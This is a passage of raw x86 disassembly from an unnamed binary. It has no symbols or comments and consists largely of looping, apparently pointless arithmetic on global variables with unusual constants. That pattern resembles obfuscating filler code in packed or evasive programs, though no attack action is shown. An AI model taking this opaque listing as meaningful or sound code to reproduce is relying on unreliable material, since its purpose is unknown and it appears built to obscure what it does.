  426cb2:	je     0x426ce0
  426cb4:	xor    ebp,ebp
  426cb6:	sub    ecx,0x12
  426cb9:	je     0x426cdb
  426cbb:	xor    edx,edx
  426cbd:	lea    ecx,[eax+0x2e]
  426cc0:	sub    ecx,eax
  426cc2:	sbb    ebp,edx
  426cc4:	sub    ecx,esi
  426cc6:	sbb    ebp,DWORD PTR ds:0x43e09c
  426ccc:	add    ecx,0x2e
  426ccf:	adc    ebp,edx
  426cd1:	mov    esi,ecx
  426cd3:	mov    DWORD PTR ds:0x43e09c,ebp
  426cd9:	jmp    0x426ce8
  426cdb:	lea    esi,[ebx+0x18]
  426cde:	jmp    0x426cd3
  426ce0:	movzx  eax,si
  426ce3:	sub    eax,ebx
  426ce5:	inc    eax
  426ce6:	mov    ebx,eax
  426ce8:	lea    eax,[esi+ebx*1+0x5]
  426cec:	cmp    ebx,eax
  426cee:	jne    0x426d12
  426cf0:	push   0x0
  426cf2:	push   0x5c
  426cf4:	push   ebp
  426cf5:	push   esi
  426cf6:	call   0x437b80
  426cfb:	xor    ecx,ecx
  426cfd:	cmp    ebx,eax
  426cff:	jne    0x426d05
  426d01:	cmp    ecx,edx
  426d03:	je     0x426d0e
  426d05:	mov    eax,ebx
  426d07:	sub    eax,esi
  426d09:	add    eax,0x2e
  426d0c:	jmp    0x426d12
  426d0e:	lea    eax,[esi+ebx*1+0x4]
  426d12:	xor    edx,edx
  426d14:	mov    ecx,eax
  426d16:	add    ecx,esi
  426d18:	adc    edx,ebp
  426d1a:	add    ecx,0x32
  426d1d:	adc    edx,0x0
  426d20:	mov    DWORD PTR [esp+0x1c],edx
  426d24:	xor    edx,edx
  426d26:	cmp    ecx,ebx
  426d28:	jne    0x426d34
  426d2a:	cmp    DWORD PTR [esp+0x1c],edx
  426d2e:	jne    0x426d34
  426d30:	lea    eax,[esi+ebx*1+0x1f]
  426d34:	dec    DWORD PTR [esp+0x10]
  426d38:	jne    0x426caf
  426d3e:	lea    eax,[esi+ebx*1+0x4]
  426d42:	lea    ecx,[edi+eax*1+0x4]
  426d46:	mov    DWORD PTR ds:0x43e094,ecx
  426d4c:	dec    ecx
  426d4d:	je     0x426d68
  426d4f:	sub    ecx,0x12
  426d52:	je     0x426d5d
  426d54:	push   0x5c
  426d56:	pop    ecx
  426d57:	sub    ecx,edi
  426d59:	mov    edi,ecx
  426d5b:	jmp    0x426d82
  426d5d:	mov    edi,DWORD PTR ds:0x43e058
  426d63:	add    edi,0x18
  426d66:	jmp    0x426d82
  426d68:	movzx  ecx,di
  426d6b:	sub    ecx,DWORD PTR ds:0x43e058
  426d71:	inc    ecx
  426d72:	mov    DWORD PTR ds:0x43e058,ecx
  426d78:	lea    ecx,[ecx+edi*1+0x1f]
  426d7c:	mov    DWORD PTR ds:0x43e094,ecx
  426d82:	mov    DWORD PTR [esp+0x10],0x3c
  426d8a:	cmp    ebx,esi
  426d8c:	jne    0x426d94
  426d8e:	xor    ecx,ecx
  426d90:	cmp    ecx,ebp
  426d92:	je     0x426dd9
  426d94:	lea    eax,[esi+ebx*1+0x5]
  426d98:	cmp    eax,0x39b
  426d9d:	je     0x426dd9
  426d9f:	xor    edx,edx
  426da1:	mov    ecx,eax
  426da3:	add    ecx,esi
  426da5:	adc    edx,ebp
  426da7:	push   0x0
  426da9:	add    ecx,0x32
  426dac:	pop    ebp
  426dad:	adc    edx,ebp
  426daf:	cmp    ecx,ebx
  426db1:	jne    0x426dbd
  426db3:	xor    ecx,ecx
  426db5:	cmp    edx,ecx
  426db7:	jne    0x426dbd
  426db9:	lea    eax,[esi+ebx*1+0x1f]
  426dbd:	add    DWORD PTR [esp+0x10],0x5
  426dc2:	cmp    DWORD PTR [esp+0x10],0xc4f
  426dca:	movzx  ecx,bl
  426dcd:	lea    esi,[ecx+eax*1+0x4]
  426dd1:	mov    DWORD PTR ds:0x43e09c,ebp
  426dd7:	jl     0x426d8a
  426dd9:	mov    ecx,DWORD PTR ds:0x43e094
  426ddf:	mov    edx,DWORD PTR ds:0x43e058
  426de5:	add    eax,edi
  426de7:	lea    eax,[ecx+eax*1+0x3ef9]
  426dee:	mov    ecx,ebx
  426df0:	sub    ecx,esi
  426df2:	lea    ebp,[edx+eax*1-0x32]
  426df6:	add    ecx,0x2e
  426df9:	cmp    ebp,0x23e
  426dff:	jb     0x426e08
  426e01:	mov    edi,edx
  426e03:	sub    edi,eax
  426e05:	add    edi,0x2e
  426e08:	xor    eax,eax
  426e0a:	mov    ebp,ecx
  426e0c:	sub    ebp,edi
  426e0e:	sub    ebp,0x3222
  426e14:	mov    edi,ecx
  426e16:	sub    edi,esi
  426e18:	sbb    eax,DWORD PTR ds:0x43e09c
  426e1e:	push   0x3c
  426e20:	mov    DWORD PTR [esp+0x20],eax
  426e24:	movzx  eax,bx
  426e27:	cdq    
  426e28:	add    edi,eax
  426e2a:	mov    eax,DWORD PTR [esp+0x20]
  426e2e:	adc    eax,edx
  426e30:	mov    ds:0x43e09c,eax
  426e35:	pop    esi
  426e36:	cmp    ebx,edi
  426e38:	jne    0x426e44
  426e3a:	xor    eax,eax
  426e3c:	cmp    eax,DWORD PTR ds:0x43e09c
  426e42:	je     0x426e89
  426e44:	lea    ecx,[edi+ebx*1+0x5]
  426e48:	cmp    ecx,0x39b
  426e4e:	je     0x426e89
  426e50:	xor    edx,edx
  426e52:	mov    eax,ecx
  426e54:	add    eax,edi
  426e56:	adc    edx,DWORD PTR ds:0x43e09c
  426e5c:	add    eax,0x32
  426e5f:	adc    edx,0x0
  426e62:	cmp    eax,ebx
  426e64:	jne    0x426e70
  426e66:	xor    eax,eax
  426e68:	cmp    edx,eax
  426e6a:	jne    0x426e70
  426e6c:	lea    ecx,[edi+ebx*1+0x1f]
  426e70:	and    DWORD PTR ds:0x43e09c,0x0
  426e77:	movzx  eax,bl
  426e7a:	add    esi,0x5
  426e7d:	cmp    esi,0xc4f
  426e83:	lea    edi,[eax+ecx*1+0x4]
  426e87:	jl     0x426e36
  426e89:	mov    edx,DWORD PTR ds:0x43e058
  426e8f:	movzx  eax,bl
  426e92:	lea    edi,[eax+ecx*1+0x4]
  426e96:	lea    ecx,[ecx+ebp*1+0x5]
  426e9a:	xor    esi,esi
  426e9c:	lea    edx,[edx+ecx*1-0x32]
  426ea0:	cmp    edx,0x23e
  426ea6:	mov    DWORD PTR ds:0x43e09c,esi
  426eac:	lea    eax,[edi+ebx*1+0x4]
  426eb0:	jb     0x426ebd
  426eb2:	mov    ebp,DWORD PTR ds:0x43e058
  426eb8:	sub    ebp,ecx
  426eba:	add    ebp,0x2e
  426ebd:	mov    DWORD PTR [esp+0x10],0x9b9
  426ec5:	mov    ecx,eax
  426ec7:	dec    ecx
  426ec8:	je     0x426ef6
  426eca:	xor    esi,esi
  426ecc:	sub    ecx,0x12
  426ecf:	je     0x426ef1
  426ed1:	xor    edx,edx
  426ed3:	lea    ecx,[eax+0x2e]
  426ed6:	sub    ecx,eax
  426ed8:	sbb    esi,edx
  426eda:	sub    ecx,edi
  426edc:	sbb    esi,DWORD PTR ds:0x43e09c
  426ee2:	add    ecx,0x2e
  426ee5:	adc    esi,edx
  426ee7:	mov    edi,ecx
  426ee9:	mov    DWORD PTR ds:0x43e09c,esi
  426eef:	jmp    0x426efe
  426ef1:	lea    edi,[ebx+0x18]
  426ef4:	jmp    0x426ee9
  426ef6:	movzx  eax,di
  426ef9:	sub    eax,ebx
  426efb:	inc    eax
  426efc:	mov    ebx,eax
  426efe:	lea    eax,[edi+ebx*1+0x5]
  426f02:	cmp    ebx,eax
  426f04:	jne    0x426f28
  426f06:	push   0x0
  426f08:	push   0x5c
  426f0a:	push   esi
  426f0b:	push   edi
  426f0c:	call   0x437b80
  426f11:	xor    ecx,ecx
  426f13:	cmp    ebx,eax
  426f15:	jne    0x426f1b
  426f17:	cmp    ecx,edx
  426f19:	je     0x426f24
  426f1b:	mov    eax,ebx
  426f1d:	sub    eax,edi
  426f1f:	add    eax,0x2e
  426f22:	jmp    0x426f28
  426f24:	lea    eax,[edi+ebx*1+0x4]
  426f28:	xor    edx,edx
  426f2a:	mov    ecx,eax
  426f2c:	add    ecx,edi
  426f2e:	adc    edx,esi
  426f30:	add    ecx,0x32
  426f33:	adc    edx,0x0
  426f36:	mov    DWORD PTR [esp+0x1c],edx
  426f3a:	xor    edx,edx
  426f3c:	cmp    ecx,ebx
  426f3e:	jne    0x426f4a
  426f40:	cmp    DWORD PTR [esp+0x1c],edx
  426f44:	jne    0x426f4a
  426f46:	lea    eax,[edi+ebx*1+0x1f]
  426f4a:	dec    DWORD PTR [esp+0x10]
  426f4e:	jne    0x426ec5
  426f54:	lea    edx,[eax+ebp*1+0x5]
  426f58:	lea    ecx,[edi+ebx*1]
  426f5b:	lea    ecx,[eax+ecx*1+0x3ef9]
  426f62:	movzx  eax,cl
  426f65:	lea    eax,[eax+edx*1-0xe]
  426f69:	mov    ds:0x43e07c,eax
  426f6e:	xor    ebp,ebp
  426f70:	movzx  eax,bx
  426f73:	mov    esi,ecx
  426f75:	sub    esi,edi
  426f77:	sbb    ebp,DWORD PTR ds:0x43e09c
  426f7d:	cdq    
  426f7e:	add    esi,eax
  426f80:	adc    ebp,edx
  426f82:	mov    DWORD PTR [esp+0x10],0x9b9
  426f8a:	mov    eax,ecx
  426f8c:	dec    eax
  426f8d:	je     0x426fb5
  426f8f:	sub    eax,0x12
  426f92:	je     0x426fae
  426f94:	xor    edx,edx
  426f96:	xor    edi,edi
  426f98:	lea    eax,[ecx+0x2e]
  426f9b:	sub    eax,ecx
  426f9d:	sbb    edx,edi
  426f9f:	sub    eax,esi
  426fa1:	sbb    edx,ebp
  426fa3:	add    eax,0x2e
  426fa6:	adc    edx,edi
  426fa8:	mov    esi,eax
  426faa:	mov    ebp,edx
  426fac:	jmp    0x426fbd
  426fae:	lea    esi,[ebx+0x18]
  426fb1:	xor    ebp,ebp
  426fb3:	jmp    0x426fbd
  426fb5:	movzx  eax,si
  426fb8:	sub    eax,ebx
  426fba:	inc    eax
  426fbb:	mov    ebx,eax
  426fbd:	lea    ecx,[esi+ebx*1+0x5]
  426fc1:	cmp    ebx,ecx
  426fc3:	jne    0x426fe7
  426fc5:	push   0x0
  426fc7:	push   0x5c
  426fc9:	push   ebp
  426fca:	push   esi
  426fcb:	call   0x437b80
  426fd0:	xor    ecx,ecx
  426fd2:	cmp    ebx,eax
  426fd4:	jne    0x426fda
  426fd6:	cmp    ecx,edx
  426fd8:	je     0x426fe3
  426fda:	mov    ecx,ebx
  426fdc:	sub    ecx,esi
  426fde:	add    ecx,0x2e
  426fe1:	jmp    0x426fe7
  426fe3:	lea    ecx,[esi+ebx*1+0x4]
  426fe7:	xor    edx,edx
  426fe9:	mov    eax,ecx
  426feb:	add    eax,esi
  426fed:	adc    edx,ebp
  426fef:	add    eax,0x32
  426ff2:	adc    edx,0x0
  426ff5:	xor    edi,edi
  426ff7:	cmp    eax,ebx
  426ff9:	jne    0x427003
  426ffb:	cmp    edx,edi
  426ffd:	jne    0x427003
  426fff:	lea    ecx,[esi+ebx*1+0x1f]
  427003:	dec    DWORD PTR [esp+0x10]
  427007:	jne    0x426f8a
  427009:	mov    edi,DWORD PTR ds:0x43e07c
  42700f:	mov    eax,edi
  427011:	sub    eax,esi
  427013:	lea    ecx,[eax+ebx*1+0x32]
  427017:	mov    eax,ebx
  427019:	sub    eax,esi
  42701b:	add    eax,0x2e
  42701e:	dec    ecx
  42701f:	je     0x427040
  427021:	sub    ecx,0x12
  427024:	je     0x427035
  427026:	push   0x5c
  427028:	pop    ecx
  427029:	sub    ecx,edi
  42702b:	mov    edi,ecx
  42702d:	mov    ecx,DWORD PTR ds:0x43e058
  427033:	jmp    0x427050
  427035:	mov    ecx,DWORD PTR ds:0x43e058
  42703b:	lea    edi,[ecx+0x18]
  42703e:	jmp    0x427050
  427040:	movzx  ecx,di
  427043:	sub    ecx,DWORD PTR ds:0x43e058
  427049:	inc    ecx
  42704a:	mov    DWORD PTR ds:0x43e058,ecx
  427050:	lea    edx,[eax+ebx*1-0x32]
  427054:	cmp    edx,0x23e
  42705a:	jb     0x427065
  42705c:	mov    esi,ebx
  42705e:	sub    esi,eax
  427060:	add    esi,0x2e
  427063:	xor    ebp,ebp
  427065:	lea    eax,[edi+eax*1+0x4]
  427069:	lea    edx,[ecx+eax*1-0x32]
  42706d:	cmp    edx,0x23e
  427073:	jb     0x42707c
  427075:	mov    edi,ecx
  427077:	sub    edi,eax
  427079:	add    edi,0x2e
  42707c:	push   0x0
  42707e:	push   0x5c
  427080:	push   ebp
  427081:	push   esi
  427082:	call   0x437b80
  427087:	cmp    ebx,eax
  427089:	jne    0x427091
  42708b:	xor    eax,eax
  42708d:	cmp    eax,edx
  42708f:	je     0x42709a
  427091:	mov    eax,ebx
  427093:	sub    eax,esi
  427095:	add    eax,0x2e
  427098:	jmp    0x42709e
  42709a:	lea    eax,[esi+ebx*1+0x4]
  42709e:	sub    eax,edi
  4270a0:	sub    eax,0x3222
  4270a5:	mov    edi,eax
  4270a7:	lea    ecx,[esi+ebx*1+0x1f]
  4270ab:	xor    edx,edx
  4270ad:	mov    eax,ecx
  4270af:	add    eax,esi
  4270b1:	adc    edx,ebp
  4270b3:	add    eax,0x32
  4270b6:	adc    edx,0x0
  4270b9:	cmp    eax,ebx
  4270bb:	mov    DWORD PTR [esp+0x10],ecx
  4270bf:	jne    0x4270c7
  4270c1:	xor    eax,eax
  4270c3:	cmp    edx,eax
  4270c5:	jne    0x4270c7
  4270c7:	lea    eax,[esi+ebx*1]
  4270ca:	lea    eax,[ecx+eax*1+0x3ef9]
  4270d1:	xor    ecx,ecx
  4270d3:	mov    edx,eax
  4270d5:	add    edx,esi
  4270d7:	adc    ecx,ebp
  4270d9:	add    edx,0x32
  4270dc:	adc    ecx,0x0
  4270df:	cmp    edx,ebx
  4270e1:	mov    ds:0x43e05c,eax
  4270e6:	jne    0x4270f7
  4270e8:	xor    edx,edx
  4270ea:	cmp    ecx,edx
  4270ec:	jne    0x4270f7
  4270ee:	mov    eax,DWORD PTR [esp+0x10]
  4270f2:	mov    ds:0x43e05c,eax
  4270f7:	mov    esi,eax
  4270f9:	sub    esi,edi
  4270fb:	movzx  ecx,bl
  4270fe:	add    esi,0x2e
  427101:	lea    ecx,[ecx+eax*1-0xe]
  427105:	push   0x48
  427107:	xor    edx,edx
  427109:	pop    ebp
  42710a:	mov    eax,esi
  42710c:	div    ebp
  42710e:	and    DWORD PTR ds:0x43e09c,0x0
  427115:	mov    ebp,DWORD PTR ds:0x43e058
  42711b:	cmp    eax,0x65
  42711e:	jbe    0x42712a
  427120:	lea    eax,[edi+ebp*1]
  427123:	lea    esi,[esi+eax*1+0x3ef9]
  42712a:	mov    eax,ds:0x43e05c
  42712f:	push   0x48
  427131:	xor    edx,edx
  427133:	pop    edi
  427134:	div    edi
  427136:	cmp    eax,0x65
  427139:	jbe    0x42714d
  42713b:	mov    edx,DWORD PTR ds:0x43e05c
  427141:	lea    eax,[ecx+ebx*1]
  427144:	lea    eax,[edx+eax*1+0x3ef9]
  42714b:	jmp    0x427152
  42714d:	mov    al,ds:0x43e05c
  427152:	movzx  eax,al
  427155:	lea    esi,[eax+esi*1-0xe]
  427159:	mov    edx,esi
  42715b:	imul   edx,edx,0x5c
  42715e:	cmp    ebp,edx
  427160:	lea    eax,[ecx+ebx*1+0x1f]
  427164:	je     0x42716d
  427166:	sub    ebp,esi
  427168:	add    ebp,0x2e
  42716b:	jmp    0x427171
  42716d:	lea    ebp,[esi+ebp*1+0x4]
  427171:	mov    DWORD PTR [esp+0x10],0x3c
  427179:	cmp    ebx,ecx
  42717b:	jne    0x427187
  42717d:	xor    edx,edx
  42717f:	cmp    edx,DWORD PTR ds:0x43e09c
  427185:	je     0x4271d7
  427187:	lea    eax,[ecx+ebx*1+0x5]
  42718b:	cmp    eax,0x39b
  427190:	je     0x4271d7
  427192:	xor    edx,edx
  427194:	mov    DWORD PTR [esp+0x18],eax
  427198:	add    DWORD PTR [esp+0x18],ecx
  42719c:	mov    edi,DWORD PTR [esp+0x18]
  4271a0:	adc    edx,DWORD PTR ds:0x43e09c
  4271a6:	add    edi,0x32
  4271a9:	adc    edx,0x0
  4271ac:	cmp    edi,ebx
  4271ae:	jne    0x4271ba
  4271b0:	xor    edi,edi
  4271b2:	cmp    edx,edi
  4271b4:	jne    0x4271ba
  4271b6:	lea    eax,[ecx+ebx*1+0x1f]
  4271ba:	add    DWORD PTR [esp+0x10],0x5
  4271bf:	and    DWORD PTR ds:0x43e09c,0x0
  4271c6:	cmp    DWORD PTR [esp+0x10],0xc4f
  4271ce:	movzx  ecx,bl
  4271d1:	lea    ecx,[ecx+eax*1+0x4]
  4271d5:	jl     0x427179
  4271d7:	movzx  eax,ax
  4271da:	sub    eax,esi
  4271dc:	add    eax,ebp
  4271de:	xor    edi,edi
  4271e0:	push   edi
  4271e1:	mov    ds:0x43e07c,eax
  4271e6:	pop    eax
  4271e7:	lea    esi,[ebx-0x3222]
  4271ed:	sub    esi,ecx
  4271ef:	sbb    edi,eax
  4271f1:	push   0x48
  4271f3:	xor    edx,edx
  4271f5:	mov    eax,ebp
  4271f7:	pop    ecx
  4271f8:	div    ecx
  4271fa:	mov    DWORD PTR ds:0x43e098,esi
  427200:	mov    DWORD PTR ds:0x43e09c,edi
  427206:	cmp    eax,0x65
  427209:	jbe    0x42721f
  42720b:	mov    eax,ds:0x43e058
  427210:	mov    ecx,DWORD PTR ds:0x43e07c
  427216:	add    eax,ecx
  427218:	lea    ebp,[eax+ebp*1+0x3ef9]
  42721f:	mov    DWORD PTR [esp+0x10],0x3c
  427227:	cmp    ebx,esi
  427229:	jne    0x427231
  42722b:	xor    eax,eax
  42722d:	cmp    eax,edi
  42722f:	je     0x42727c
  427231:	lea    eax,[esi+ebx*1+0x5]
  427235:	cmp    eax,0x39b
  42723a:	je     0x42727c
  42723c:	xor    edx,edx
  42723e:	mov    ecx,eax
  427240:	add    ecx,esi
  427242:	adc    edx,edi
  427244:	push   0x0
  427246:	add    ecx,0x32
  427249:	pop    edi
  42724a:	adc    edx,edi
  42724c:	cmp    ecx,ebx
  42724e:	jne    0x42725a
  427250:	xor    ecx,ecx
  427252:	cmp    edx,ecx
  427254:	jne    0x42725a
  427256:	lea    eax,[esi+ebx*1+0x1f]
  42725a:	add    DWORD PTR [esp+0x10],0x5
  42725f:	cmp    DWORD PTR [esp+0x10],0xc4f
  427267:	movzx  esi,bl
  42726a:	lea    esi,[esi+eax*1+0x4]
  42726e:	mov    DWORD PTR ds:0x43e098,esi
  427274:	mov    DWORD PTR ds:0x43e09c,edi
  42727a:	jl     0x427227
  42727c:	push   0x48
  42727e:	xor    edx,edx
  427280:	mov    eax,ebp
  427282:	pop    ecx
  427283:	div    ecx
  427285:	cmp    eax,0x65
  427288:	jbe    0x42729e
  42728a:	mov    eax,ds:0x43e058
  42728f:	mov    ecx,DWORD PTR ds:0x43e07c
  427295:	add    eax,ecx
  427297:	lea    ebp,[eax+ebp*1+0x3ef9]
  42729e:	push   0x0
  4272a0:	push   0x5c
  4272a2:	push   edi
  4272a3:	push   esi
  4272a4:	call   0x437b80
  4272a9:	cmp    ebx,eax
  4272ab:	mov    DWORD PTR [esp+0x18],eax
  4272af:	mov    DWORD PTR [esp+0x1c],edx
  4272b3:	jne    0x4272bb
  4272b5:	xor    eax,eax
  4272b7:	cmp    eax,edx
  4272b9:	je     0x4272c4
  4272bb:	mov    eax,ebx
  4272bd:	sub    eax,esi
  4272bf:	add    eax,0x2e
  4272c2:	jmp    0x4272c8
  4272c4:	lea    eax,[esi+ebx*1+0x4]
  4272c8:	movzx  eax,al
  4272cb:	lea    eax,[eax+ebp*1-0xe]
  4272cf:	mov    ds:0x43e07c,eax
  4272d4:	push   0x48
  4272d6:	xor    edx,edx
  4272d8:	pop    ecx
  4272d9:	mov    eax,ebp
  4272db:	div    ecx
  4272dd:	mov    ecx,DWORD PTR ds:0x43e07c
  4272e3:	cmp    eax,0x65
  4272e6:	jbe    0x4272f6
  4272e8:	mov    eax,ds:0x43e058
  4272ed:	add    eax,ecx
  4272ef:	lea    ebp,[eax+ebp*1+0x3ef9]
  4272f6:	cmp    ebx,DWORD PTR [esp+0x18]
  4272fa:	jne    0x427304
  4272fc:	xor    eax,eax
  4272fe:	cmp    eax,DWORD PTR [esp+0x1c]
  427302:	je     0x42730d
  427304:	mov    eax,ebx
  427306:	sub    eax,esi
  427308:	add    eax,0x2e
  42730b:	jmp    0x427311
  42730d:	lea    eax,[esi+ebx*1+0x4]
  427311:	add    eax,ecx
  427313:	lea    edx,[eax+ebp*1+0x3ef9]
  42731a:	dec    edx
  42731b:	lea    ebp,[esi+ebx*1]
  42731e:	lea    eax,[ebp+0x5]
  427321:	je     0x42733c
  427323:	sub    edx,0x12
  427326:	je     0x427331
  427328:	push   0x5c
  42732a:	pop    edx
  42732b:	sub    edx,ecx
  42732d:	mov    ecx,edx
  42732f:	jmp    0x42734c
  427331:	mov    ecx,DWORD PTR ds:0x43e058
  427337:	add    ecx,0x18
  42733a:	jmp    0x42734c
  42733c:	movzx  edx,cx
  42733f:	sub    edx,DWORD PTR ds:0x43e058
  427345:	inc    edx
  427346:	mov    DWORD PTR ds:0x43e058,edx
  42734c:	movzx  edx,al
  42734f:	sub    edx,ecx
  427351:	lea    eax,[edx+eax*1+0x32]
  427355:	mov    ds:0x43e07c,eax
  42735a:	lea    ecx,[ebp+0x4]
  42735d:	xor    edx,edx
  42735f:	mov    eax,ecx
  427361:	add    eax,esi
  427363:	adc    edx,edi
  427365:	add    eax,0x32
  427368:	adc    edx,0x0
  42736b:	cmp    eax,ebx
  42736d:	mov    DWORD PTR ds:0x43e05c,ecx
  427373:	jne    0x427384
  427375:	xor    eax,eax
  427377:	cmp    edx,eax
  427379:	jne    0x427384
  42737b:	lea    ecx,[ebp+0x1f]
  42737e:	mov    DWORD PTR ds:0x43e05c,ecx
  427384:	mov    eax,ds:0x43e07c
  427389:	pop    edi
  42738a:	pop    esi
  42738b:	lea    eax,[eax+ecx*1+0x1f]
  42738f:	pop    ebp
  427390:	mov    ds:0x43e094,eax
  427395:	pop    ebx
  427396:	add    esp,0x10
  427399:	ret    
  42739a:	sub    esp,0x1c
  42739d:	push   ebx
  42739e:	push   ebp
  42739f:	mov    ebx,eax
  4273a1:	mov    eax,ds:0x43e094
  4273a6:	dec    eax
  4273a7:	push   esi
  4273a8:	push   edi
  4273a9:	je     0x4273c6
  4273ab:	sub    eax,0x12
  4273ae:	mov    ecx,DWORD PTR ds:0x43e058
  4273b4:	je     0x4273c1
  4273b6:	push   0x5c
  4273b8:	pop    edx
  4273b9:	sub    edx,DWORD PTR ds:0x43e07c
  4273bf:	jmp    0x4273dd
  4273c1:	lea    edx,[ecx+0x18]
  4273c4:	jmp    0x4273dd
  4273c6:	mov    edx,DWORD PTR ds:0x43e07c
  4273cc:	movzx  eax,dx
  4273cf:	sub    eax,DWORD PTR ds:0x43e058
  4273d5:	inc    eax
  4273d6:	mov    ds:0x43e058,eax
  4273db:	mov    ecx,eax
  4273dd:	mov    eax,ds:0x43e05c
  4273e2:	mov    edi,eax
  4273e4:	sub    edi,edx
  4273e6:	push   0x3c
  4273e8:	add    edi,0x2e
  4273eb:	pop    esi
  4273ec:	cmp    ecx,edx
  4273ee:	je     0x42741a
  4273f0:	lea    edi,[edx+ecx*1+0x5]
  4273f4:	cmp    edi,0x39b
  4273fa:	je     0x42741a
  4273fc:	lea    ebp,[edx+edi*1+0x32]
  427400:	cmp    ebp,ecx
  427402:	jne    0x427408
  427404:	lea    edi,[edx+ecx*1+0x1f]
  427408:	movzx  edx,cl
  42740b:	add    esi,0x5
  42740e:	cmp    esi,0xc4f
  427414:	lea    edx,[edx+edi*1+0x4]
  427418:	jl     0x4273ec
  42741a:	mov    edx,eax
  42741c:	dec    edx
  42741d:	je     0x427447
  42741f:	xor    ebp,ebp
  427421:	sub    edx,0x12
  427424:	je     0x427442
  427426:	xor    edx,edx
  427428:	lea    esi,[eax+0x2e]
  42742b:	sub    esi,eax
  42742d:	sbb    ebp,edx
  42742f:	sub    esi,DWORD PTR ds:0x43e098
  427435:	sbb    ebp,DWORD PTR ds:0x43e09c
  42743b:	add    esi,0x2e
  42743e:	adc    ebp,edx
  427440:	jmp    0x42745f
  427442:	lea    esi,[ebx+0x18]
  427445:	jmp    0x42745f
  427447:	mov    esi,DWORD PTR ds:0x43e098
  42744d:	mov    ebp,DWORD PTR ds:0x43e09c
  427453:	movzx  eax,si
  427456:	sub    eax,ebx
  427458:	inc    eax
  427459:	mov    ebx,eax
  42745b:	lea    eax,[esi+ebx*1+0x1f]
  42745f:	and    DWORD PTR [esp+0x18],0x0
  427464:	movzx  edx,al
  427467:	lea    edx,[edx+edi*1-0xe]
  42746b:	lea    edi,[esi+ebx*1]
  42746e:	lea    edi,[eax+edi*1+0x3ef9]
  427475:	lea    eax,[ebx-0x3222]
  42747b:	mov    DWORD PTR [esp+0x14],eax
  42747f:	sub    eax,esi
  427481:	mov    esi,DWORD PTR [esp+0x18]
  427485:	sbb    esi,ebp
  427487:	mov    ebp,edx
  427489:	imul   ebp,ebp,0x5c
  42748c:	cmp    ecx,ebp
  42748e:	mov    DWORD PTR ds:0x43e07c,edx
  427494:	je     0x4274af
  427496:	mov    edx,ecx
  427498:	sub    edx,DWORD PTR ds:0x43e07c
  42749e:	add    edx,0x2e
  4274a1:	mov    DWORD PTR ds:0x43e094,edx
  4274a7:	mov    edx,DWORD PTR ds:0x43e07c
  4274ad:	jmp    0x4274b9
  4274af:	lea    ebp,[edx+ecx*1+0x4]
  4274b3:	mov    DWORD PTR ds:0x43e094,ebp
  4274b9:	mov    DWORD PTR [esp+0x10],0x3c
  4274c1:	cmp    ebx,eax
  4274c3:	jne    0x4274cb
  4274c5:	xor    ebp,ebp
  4274c7:	cmp    ebp,esi
  4274c9:	je     0x42751a
  4274cb:	lea    edi,[eax+ebx*1+0x5]
  4274cf:	cmp    edi,0x39b
  4274d5:	je     0x42751a
  4274d7:	and    DWORD PTR [esp+0x20],0x0
  4274dc:	mov    ebp,DWORD PTR [esp+0x20]
  4274e0:	mov    DWORD PTR [esp+0x1c],edi
  4274e4:	add    DWORD PTR [esp+0x1c],eax
  4274e8:	adc    ebp,esi
  4274ea:	mov    esi,DWORD PTR [esp+0x1c]
  4274ee:	add    esi,0x32
  4274f1:	adc    ebp,0x0
  4274f4:	cmp    esi,ebx
  4274f6:	jne    0x427502
  4274f8:	xor    esi,esi
  4274fa:	cmp    ebp,esi
  4274fc:	jne    0x427502
  4274fe:	lea    edi,[eax+ebx*1+0x1f]
  427502:	add    DWORD PTR [esp+0x10],0x5
  427507:	movzx  eax,bl
  42750a:	xor    esi,esi
  42750c:	cmp    DWORD PTR [esp+0x10],0xc4f
  427514:	lea    eax,[eax+edi*1+0x4]
  427518:	jl     0x4274c1
  42751a:	add    eax,ebx
  42751c:	mov    ebp,edi
  42751e:	sub    ebp,edx
  427520:	lea    edi,[edi+eax*1+0x3ef9]
  427527:	mov    eax,ds:0x43e094
  42752c:	lea    edx,[ecx+eax*1-0x32]
  427530:	sub    ebp,0x3222
  427536:	cmp    edx,0x23e
  42753c:	jb     0x427545
  42753e:	mov    ebp,ecx
  427540:	sub    ebp,eax
  427542:	add    ebp,0x2e
  427545:	mov    esi,DWORD PTR [esp+0x14]
  427549:	movzx  eax,bl
  42754c:	lea    eax,[eax+edi*1+0x4]
  427550:	xor    edx,edx
  427552:	sub    esi,eax
  427554:	mov    eax,DWORD PTR [esp+0x18]
  427558:	sbb    eax,edx
  42755a:	mov    ds:0x43e09c,eax
  42755f:	mov    eax,edi
  427561:	dec    eax
  427562:	mov    DWORD PTR ds:0x43e098,esi
  427568:	je     0x42759e
  42756a:	sub    eax,0x12
  42756d:	je     0x427592
  42756f:	lea    eax,[edi+0x2e]
  427572:	mov    esi,eax
  427574:	xor    eax,eax
  427576:	sub    esi,edi
  427578:	sbb    eax,edx
  42757a:	sub    esi,DWORD PTR ds:0x43e098
  427580:	sbb    eax,DWORD PTR ds:0x43e09c
  427586:	add    esi,0x2e
  427589:	adc    eax,edx
  42758b:	mov    ds:0x43e09c,eax
  427590:	jmp    0x4275aa
  427592:	and    DWORD PTR ds:0x43e09c,0x0
  427599:	lea    esi,[ebx+0x18]
  42759c:	jmp    0x4275aa
  42759e:	movzx  eax,si
  4275a1:	sub    eax,ebx
  4275a3:	inc    eax
  4275a4:	mov    ebx,eax
  4275a6:	lea    edi,[esi+ebx*1+0x1f]
  4275aa:	movzx  eax,bx
  4275ad:	cdq    
  4275ae:	mov    DWORD PTR [esp+0x14],eax
  4275b2:	mov    DWORD PTR [esp+0x18],edx
  4275b6:	xor    edx,edx
  4275b8:	mov    eax,edi
  4275ba:	sub    eax,esi
  4275bc:	sbb    edx,DWORD PTR ds:0x43e09c
  4275c2:	add    eax,DWORD PTR [esp+0x14]
  4275c6:	push   0x48
  4275c8:	adc    edx,DWORD PTR [esp+0x1c]
  4275cc:	mov    ds:0x43e098,eax
  4275d1:	mov    DWORD PTR ds:0x43e09c,edx
  4275d7:	xor    edx,edx
  4275d9:	mov    eax,edi
  4275db:	pop    esi
  4275dc:	div    esi
  4275de:	cmp    eax,0x65
  4275e1:	jbe    0x4275f1
  4275e3:	mov    eax,ds:0x43e098
  4275e8:	add    eax,ebx
  4275ea:	lea    edi,[edi+eax*1+0x3ef9]
  4275f1:	lea    eax,[edi+ebp*1+0x1f]
  4275f5:	mov    ds:0x43e094,eax
  4275fa:	mov    edx,DWORD PTR ds:0x43e094
  427600:	xor    eax,eax
  427602:	mov    esi,edi
  427604:	sub    esi,DWORD PTR ds:0x43e098
